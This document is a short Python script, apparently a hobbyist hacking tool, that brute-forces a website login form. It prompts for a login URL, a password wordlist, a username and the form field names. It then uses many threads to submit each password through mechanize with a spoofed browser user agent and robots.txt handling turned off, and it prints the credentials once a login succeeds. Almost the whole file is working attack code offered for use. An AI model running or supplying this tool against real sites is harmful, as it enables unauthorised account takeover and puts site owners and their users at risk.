import mechanize
import requests
import time
from concurrent.futures import ThreadPoolExecutor

global count
count = 0

with open("proxies.txt", 'r+') as f:
    f.truncate(0)

print('''           
       +-------------Welcome!------------+
       |  119 101 108 99 111 109 101 33  |
       | .-- . .-.. -.-. --- -- . .-.-.- | 
       | 167 145 154 143 157 155 145 041 | 
       +---------------------------------+ 
''')

url = input(f'URL of the login page: ')
text_list = input(f'Wordlist path: ')
user_name = input(f'Username: ')
username_input = input(f'Username field name: ')
password_input = input(f'Password field name: ')
threads = int(input("Amount of threads: "))


def attack(x):
    global count
    br = mechanize.Browser()
    br.addheaders = [('User-agent',
                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.open(url, timeout=5)

    br.select_form(nr=0)
    br.form[username_input] = user_name
    br.form[password_input] = x
    resp = br.submit()
    time.sleep(0.1)
    count += 1
    if resp.geturl() == url:
        print(f'-[idk]- [-] Wrong password: ' + x)
    else:
        print('''\n found: \n{
        username ==> ''' + user_name + '''
        password ==> ''' + x + '''
        }''')
        exit(0)


def hack():
    global passwords
    file = open(text_list, "r")
    passwords = file.read().splitlines()
    execute = ThreadPoolExecutor(max_workers=threads)
    execute.map(attack, passwords)
    execute.shutdown(wait=True)

# url = "my very secret website"
# text_list = "./wl.txt"
# user_name = "wfsec"
# username_input = "username"
# password_input = "password"


if __name__ == '__main__':
    hack()
